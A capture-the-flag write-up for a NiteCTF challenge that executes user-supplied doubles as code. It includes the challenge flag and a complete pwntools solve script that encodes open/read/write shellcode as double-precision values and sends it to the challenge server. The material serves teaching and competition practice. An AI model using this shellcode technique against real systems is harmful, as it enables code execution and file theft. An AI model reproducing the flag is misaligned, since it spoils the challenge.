# IEEE Dancer 
Provided is a binary which on disassembly does the following, It reads an integer n (must be <= 0x64 = 100), Allocates n doubles on the heap:
[It calls calloc(n, 8) → that’s n * 8 bytes (because a double is 8 bytes)]
It reads n doubles into that heap buffer via inside a loop it calls scanf("%lf", &buf[i])
Following which it makes the page containing that heap buffer executable `mprotect(aligned_heap_page, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC)`
Then it enables a seccomp filter. At the end of main we also see 
	•	mov rdx, heap_ptr
	•	call rdx

Which means that the CPU starts executing whatever bytes are inside our heap buffer. 

Therefore our objective is to choose float strings such that the resulting 8 bytes in memory are the exact machine-code bytes we want.

## Flag
```
nite{W4stem4n_dr41nss_aLLth3_fl04Ts_int0_ex3cut5bl3_sp4ce}
```

## Solution


```py
#!/usr/bin/env python3
"""
NiteCTF - dancer (float-to-shellcode)

This script:
  1) assembles ORW shellcode in tiny snippets (<= 8 bytes each),
  2) pads each snippet to 8 bytes with NOPs,
  3) reinterprets those 8 bytes as an IEEE-754 double,
  4) prints the double in high-precision scientific notation so scanf("%lf")
     reconstructs the exact same 64-bit pattern,
  5) sends N and the N double strings to the target.

Usage:
  python3 solve_rewrite.py --remote dancer.chals.nitectf25.live 1337
  python3 solve_rewrite.py --local ./chall
"""

import argparse
import struct
from typing import List

from pwn import asm, context, remote, process


def bytes_to_double_token(eightish: bytes, digits: int = 30) -> str:
    """
    Take up to 8 bytes of machine code, pad to 8 with NOPs,
    reinterpret as little-endian double, return a string that round-trips via scanf("%lf").
    """
    chunk = eightish.ljust(8, b"\x90")  # NOP padding
    if len(chunk) != 8:
        raise ValueError("Internal error: chunk not 8 bytes after padding")

    dbl = struct.unpack("<d", chunk)[0]
    # High precision decimal scientific notation for safe round-trip.
    # Uppercase E matches typical tooling but isn't required.
    return f"{dbl:.{digits}E}"


def assemble_snippet(asm_text: str) -> bytes:
    """
    Assemble one instruction group and ensure it fits in a single 8-byte double slot.
    """
    code = asm(asm_text)
    if len(code) > 8:
        raise ValueError(f"Snippet too long ({len(code)} bytes): {asm_text!r}")
    return code


def build_orw_double_tokens() -> List[str]:
    """
    Build ORW shellcode tokens (open/read/write) consistent with the official solve.
    It opens "./flag" and prints up to 0x60 bytes.
    """
    # We rely on amd64 Linux syscalls and the target setting RDX to heap ptr before call.
    # (The official solve uses [rdx+0x200] as a read buffer.)
    asm_blocks = [
        "mov eax, 0x67616c66",          # 'flag'
        "shl rax, 16",
        "add rax, 0x2f2e",              # './'
        "push rax; mov rdi, rsp",       # filename ptr -> rdi
        "xor rsi, rsi",                 # O_RDONLY
        "mov rax, 2",                   # open
        "syscall",

        "mov rdi, rax",                 # fd -> rdi
        "lea rsi, [rdx+0x200]",          # buf -> rsi  (rdx starts as heap ptr in this chall)
        "mov rdx, 0x60",                # count
        "mov rax, 0",                   # read
        "syscall",

        "mov rdi, 1",                   # stdout
        "mov rax, 1",                   # write
        "syscall",
    ]

    tokens: List[str] = []
    for block in asm_blocks:
        snippet = assemble_snippet(block)
        tokens.append(bytes_to_double_token(snippet, digits=30))
    return tokens


def make_input_blob(tokens: List[str]) -> bytes:
    """
    Format input as:
      N\n
      token0\n
      token1\n
      ...
    """
    lines = [str(len(tokens)), *tokens]
    return ("\n".join(lines) + "\n").encode()


def main() -> None:
    parser = argparse.ArgumentParser(description="Float-encoded ORW solver (rewritten).")
    mode = parser.add_mutually_exclusive_group(required=True)
    mode.add_argument("--remote", nargs=2, metavar=("HOST", "PORT"),
                      help="Connect to remote HOST PORT over SSL")
    mode.add_argument("--local", metavar="PATH", help="Run local binary at PATH")
    parser.add_argument("--digits", type=int, default=30,
                        help="Decimal digits in scientific float formatting (default: 30)")
    args = parser.parse_args()

    context.clear(arch="amd64", os="linux")

    # Build tokens; re-format with chosen precision
    tokens = build_orw_double_tokens()
    if args.digits != 30:
        # Recompute tokens at requested precision (keeping bytes identical)
        # (precision only affects the string, not the intended bit-pattern)
        rebuilt = []
        for t in tokens:
            # parse back to float, then reformat; safest is rebuild from bytes again.
            # But we don't have bytes now; keep it simple: just regenerate from assembly.
            rebuilt = []
            for block in [
                "mov eax, 0x67616c66",
                "shl rax, 16",
                "add rax, 0x2f2e",
                "push rax; mov rdi, rsp",
                "xor rsi, rsi",
                "mov rax, 2",
                "syscall",
                "mov rdi, rax",
                "lea rsi, [rdx+0x200]",
                "mov rdx, 0x60",
                "mov rax, 0",
                "syscall",
                "mov rdi, 1",
                "mov rax, 1",
                "syscall",
            ]:
                rebuilt.append(bytes_to_double_token(assemble_snippet(block), digits=args.digits))
            tokens = rebuilt
            break

    payload = make_input_blob(tokens)

    if args.local:
        io = process([args.local])
    else:
        host, port_str = args.remote
        io = remote(host, int(port_str), ssl=True, sni=host)

    io.send(payload)
    io.interactive()


if __name__ == "__main__":
    main()
```
